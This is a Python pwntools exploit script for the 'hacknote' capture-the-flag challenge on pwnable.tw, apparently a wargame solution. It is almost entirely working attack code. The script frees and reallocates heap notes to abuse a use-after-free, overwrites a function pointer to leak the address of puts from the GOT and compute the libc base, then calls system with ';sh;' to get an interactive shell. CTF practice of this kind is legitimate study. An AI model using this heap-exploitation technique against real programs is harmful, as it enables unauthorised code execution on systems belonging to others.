#!/usr/bin/env python3
from pwn import remote,process,ELF,context,pause
from fastpwn import pack,log
from sys import argv
# glibc: 2.23
context(arch='i386',os='linux',log_level='DEBUG')
binary=ELF("./hacknote",checksec=False)
s=lambda x,r="":p.sendlineafter(str(r),str(x)) if r else p.sendline(str(x))
if len(argv)>1 and argv[1]=="-r": # adjust libc based on local or rem
    libc=ELF("./libc_32.so.6",checksec=False)
    p=remote("chall.pwnable.tw", 10102)
else:
    p=binary.process()
    libc=ELF("./libc.so.6",checksec=False)
# user 1
s("1",r="choice :")
s("16",r=" :")
s("AAAA",r=" :")

# user 2
s("1",r="choice :")
s("16",r=" :")
s("BBBB",r=" :")

# delete 0 - ptr saved
s("2",r=" :")
s("0",r=" :")

# delete 1 - ptr saved
s("2",r=" :")
s("1",r=" :")

# user 3 - ptr 0 may interact
s("1",r="choice :")
s("8",r=" :")

# overwrite old object, address and contents/parameter
p.sendline(pack.pk32(0x0804862B)+pack.pk32(binary.got['puts'])) # control ip
#p.sendline(pack.pk32(binary.plt['puts'])+pack.pk32(binary.got['puts'])) # control ip, ret2plt
#pause()
s("3",r="choice :")
s("0",r=" :")

p.recvuntil("Index :")
# will print all contents of note, we only want first 4 bytes; leaked libc address
base = int.from_bytes(p.recv(4),"little")-libc.symbols['puts']
context.log_level='warning'
log.log("Leaked base address of libc: %s"%hex(base))
system=libc.symbols['system']+base
log.log("Leaked address of system: %s"%hex(system))
# we do not need to leak /bin/sh, we have ability to write memory

# free user 3(index 2)
s("2",r=" :")
s("2",r=" :")
# overwrite again with system with parameter ;sh;, to ignore junk
s("1",r=" :")
s("8",r=" :")
p.sendline(pack.pk32(system) + b";sh;")

s("3",r=" :")
s("0",r=" :")
p.interactive()
